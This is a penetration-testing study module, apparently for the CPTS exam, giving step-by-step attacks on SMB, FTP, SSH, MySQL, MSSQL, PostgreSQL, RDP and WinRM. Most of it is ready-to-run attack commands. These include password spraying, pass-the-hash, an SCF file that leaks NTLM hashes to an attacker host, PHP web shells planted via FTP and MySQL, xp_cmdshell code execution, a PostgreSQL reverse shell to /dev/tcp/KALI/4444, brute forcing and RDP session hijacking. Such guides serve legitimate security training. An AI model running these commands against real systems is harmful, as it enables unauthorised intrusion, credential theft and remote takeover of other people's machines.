# 10 — Attacking Common Services

Module 03 (Footprinting) covers how to ENUMERATE services. This module covers how to ATTACK them — moving from "I found this service" to "I have access through it." The difference matters: enumeration gathers information, attacking gains access.

---

## Attacking SMB (445/tcp)

### From enumeration to exploitation

```bash
# You already know the shares and users (from enumeration)
# Now exploit:

# 1. Password spray with found credentials
crackmapexec smb TARGET -u users.txt -p 'FoundPassword!' --continue-on-success
# Machines showing (Pwn3d!) = local admin access

# 2. Relay attacks (if SMB signing is disabled)
# Check signing
crackmapexec smb TARGET --gen-relay-list nosigning.txt
# Hosts in nosigning.txt are vulnerable to NTLM relay

# 3. PsExec with found credentials (gives SYSTEM shell)
impacket-psexec domain/admin:password@TARGET
impacket-psexec domain/admin@TARGET -hashes LM:NTLM

# 4. SMBExec (alternative, uses SMB only)
impacket-smbexec domain/admin:password@TARGET

# 5. Enumerate readable shares for sensitive files
crackmapexec smb TARGET -u user -p pass --shares
smbmap -H TARGET -u user -p pass -R    # recursive listing
# Look for: config files, scripts, documentation, databases

# 6. Search shares for passwords
smbmap -H TARGET -u user -p pass -R --exclude 'ADMIN$' 'C$' 'IPC$' \
  | grep -iE "\.txt|\.conf|\.cfg|\.ini|\.xml|\.bak|\.old|\.ps1|\.bat"
```

### SMB specific attacks for CPTS

```bash
# SCF file attack (steal hashes when someone browses a writable share)
# Create an SCF file that forces an SMB connection back to you
echo '[Shell]' > hashgrab.scf
echo 'Command=2' >> hashgrab.scf
echo 'IconFile=\\KALI_IP\icon.ico' >> hashgrab.scf
echo '[Taskbar]' >> hashgrab.scf
echo 'Command=ToggleDesktop' >> hashgrab.scf

# Upload to a writable share
smbclient //TARGET/writable_share -U user%pass -c 'put hashgrab.scf'

# Start Responder to catch the hash
sudo responder -I eth0
# When someone browses the share, their NTLMv2 hash arrives
# Crack with hashcat -m 5600
```

---

## Attacking FTP (21/tcp)

```bash
# 1. Anonymous access + download everything
ftp TARGET
# login: anonymous / (blank)
ftp> binary              # switch to binary mode for non-text files
ftp> prompt off          # disable prompting for mget
ftp> mget *              # download everything
ftp> cd backups && mget * # check subdirectories

# 2. Upload to writable FTP
# If FTP root overlaps with web root → upload a web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
ftp TARGET
ftp> put shell.php
# Then: curl http://TARGET/shell.php?cmd=whoami

# 3. Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET -t 4 -f

# 4. FTP bounce scan (use FTP server to scan internal hosts)
nmap -b anonymous@TARGET INTERNAL_TARGET
```

---

## Attacking SSH (22/tcp)

```bash
# 1. Credential reuse (most common SSH attack on CPTS)
crackmapexec ssh TARGET -u found_user -p 'found_pass'
crackmapexec ssh RANGE -u users.txt -p found_pass --continue-on-success

# 2. Key-based access
# Found an id_rsa file? Use it:
chmod 600 found_id_rsa
ssh -i found_id_rsa user@TARGET
# If passphrase protected:
ssh2john found_id_rsa > keyhash.txt
john --wordlist=rockyou.txt keyhash.txt

# 3. Brute force (slow — last resort)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4 -f

# 4. SSH as a pivot (always check after gaining SSH access)
# What else can this host reach?
ip a                     # multiple interfaces?
ip route                 # routing to internal networks?
arp -a                   # neighbors on each interface?
cat /etc/hosts           # known internal hostnames?
```

---

## Attacking Databases

### MySQL (3306/tcp)

```bash
# 1. Connect with found credentials
mysql -u root -p'password' -h TARGET

# 2. Enumerate
SHOW DATABASES;
USE database_name;
SHOW TABLES;
SELECT * FROM users;
SELECT * FROM config;

# 3. Read files (needs FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/wp-config.php');

# 4. Write a web shell (needs FILE + writable web root)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# 5. UDF for command execution (advanced)
# MySQL User Defined Functions can execute OS commands
# Requires writing a shared library to the plugin directory

# 6. Extract password hashes
SELECT user, authentication_string FROM mysql.user;
# Crack with hashcat -m 300 (MySQL 4.1+)
```

### MSSQL (1433/tcp)

```bash
# 1. Connect
impacket-mssqlclient user:password@TARGET
impacket-mssqlclient user:password@TARGET -windows-auth

# 2. Enable xp_cmdshell → RCE
SQL> EXEC sp_configure 'show advanced options', 1
SQL> RECONFIGURE
SQL> EXEC sp_configure 'xp_cmdshell', 1
SQL> RECONFIGURE
SQL> xp_cmdshell 'whoami'
SQL> xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt'

# 3. Steal NTLM hash via xp_dirtree
SQL> EXEC xp_dirtree '\\KALI_IP\share'
# Captures hash in Responder: sudo responder -I eth0

# 4. Link crawling (if linked servers exist)
SQL> SELECT srvname, isremote FROM sysservers
SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]

# 5. CrackMapExec for MSSQL
crackmapexec mssql TARGET -u user -p pass -x "whoami"
crackmapexec mssql TARGET -u user -p pass --local-auth -x "whoami"
```

### PostgreSQL (5432/tcp)

```bash
# 1. Connect
psql -h TARGET -U user -d database

# 2. Enumerate
\list                            # list databases
\dt                              # list tables
SELECT * FROM users;

# 3. Read files
SELECT pg_read_file('/etc/passwd');
# Or:
CREATE TABLE tmp(data text);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp;

# 4. Command execution
COPY (SELECT '') TO PROGRAM 'id';
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/KALI/4444 0>&1"';
```

---

## Attacking RDP (3389/tcp)

```bash
# 1. Connect with found credentials
xfreerdp /v:TARGET /u:user /p:'password' /cert-ignore

# 2. Pass the hash (if you have NTLM hash)
xfreerdp /v:TARGET /u:admin /pth:NTLM_HASH /cert-ignore

# 3. Session hijacking (if you're admin on the machine)
# List sessions
query user
# Hijack another user's session
tscon SESSION_ID /dest:rdp-tcp#YOUR_SESSION
# You switch to their desktop without knowing their password

# 4. Credential extraction after RDP access
# Check for saved credentials, browser passwords, KeePass databases
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
dir /s /b C:\Users\*.kdbx C:\Users\*id_rsa* 2>nul
```

---

## Attacking WinRM (5985/tcp)

```bash
# 1. Test credentials
crackmapexec winrm TARGET -u user -p pass

# 2. Get a shell
evil-winrm -i TARGET -u user -p 'password'
evil-winrm -i TARGET -u user -H NTLM_HASH    # pass the hash

# 3. Upload/download files through evil-winrm
*Evil-WinRM* PS> upload /home/kali/tools/winpeas.exe
*Evil-WinRM* PS> download C:\Users\admin\Desktop\flag.txt

# 4. Load PowerShell scripts
*Evil-WinRM* PS> Invoke-Command -ScriptBlock { whoami }
```

---

## Service Attack Decision Tree

```
Found an open port → identified the service → now what?

SMB (445):
  ├── Null session works? → enumerate shares, users, policy
  ├── Guest access to shares? → read files for credentials
  ├── Found creds? → spray across all SMB hosts
  └── Have admin? → PsExec / secretsdump / SAM dump

FTP (21):
  ├── Anonymous access? → download everything, check for writable
  └── No anonymous? → brute force with found usernames

SSH (22):
  ├── Found password? → test credential reuse
  ├── Found SSH key? → try it (crack passphrase if needed)
  └── No creds? → brute force (slow, last resort)

MySQL (3306):
  ├── Root with no password? → game over
  ├── Found creds? → extract all databases
  ├── Have FILE privilege? → read server files
  └── Web root writable? → write a web shell

MSSQL (1433):
  ├── SA access? → xp_cmdshell → RCE
  ├── Regular user? → check linked servers
  └── No creds? → brute force sa account

RDP (3389):
  ├── Found creds? → connect and enumerate
  ├── Have admin? → session hijacking, credential extraction
  └── No creds? → brute force (very slow)

WinRM (5985):
  ├── Found creds? → evil-winrm shell
  ├── Have NTLM hash? → pass the hash
  └── No creds? → spray with found passwords
```
